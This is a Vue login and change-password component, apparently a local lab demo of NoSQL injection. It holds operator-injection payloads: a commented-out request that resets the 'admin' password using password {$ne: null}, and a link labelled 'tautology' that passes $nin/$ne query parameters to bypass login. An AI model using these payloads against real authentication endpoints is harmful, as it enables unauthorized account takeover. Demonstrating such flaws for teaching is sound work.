<script setup>
import myRequest from '../req/index.js'
import myRouter from '../router.js'
import { ref, inject } from 'vue'
import commonStore from '../store.js'
import { storeToRefs } from 'pinia'

let user = ref('')
let password = ref('')
let newPassword = ref('')
const common_store = commonStore()
let { isAdmin } = storeToRefs(common_store)
const handleLogin = () => {
  // fetch('http://localhost:3000/changePassword', { method: 'POST', headers: {
  //     'Content-Type': 'application/json',
  // },
  // body: JSON.stringify({
  //     username: 'admin',
  //     password: { $ne: null },
  //     newPassword: 123,
  // }) })
    myRequest.post('/login', {
        username: user.value,
        password: password.value,
    }).then(res => {
      common_store.changePermission(res?.data?.isAdmin)
      console.log(res)
    })
}

const handleChange = () => {
    myRequest.post('/changePassword', {
      username: user.value,
      password: password.value,
      newPassword: newPassword.value,
    }).then(res => {
      console.log(res)
    })
}

const goToAdmin = () => {
    myRouter.push({
        path: '/admin',
    })
}

</script>

<template>
  <div>
    <div style="position: absolute;height: 100%;width: 100%;">
      <a href="http://localhost:3000/login-inject?username[$nin][]=&password[$ne]=">永真式</a>
      <div>
        xx系统
        用户名<input v-model="user">
        密码<input v-model="password">
        <button @click="handleLogin">登录</button>
      </div>
      <div>
        修改密码
        用户名<input v-model="user">
        密码<input v-model="password">
        新密码<input v-model="newPassword">
        <button @click="handleChange">修改</button>
      </div>
      <button v-if="isAdmin" class="go-to-admin" @click="goToAdmin">进入管理页</button>
    </div>
  </div>
</template>

<style scoped>
.click-hack{
  height: 100%;
  width: 100%;
}
</style>
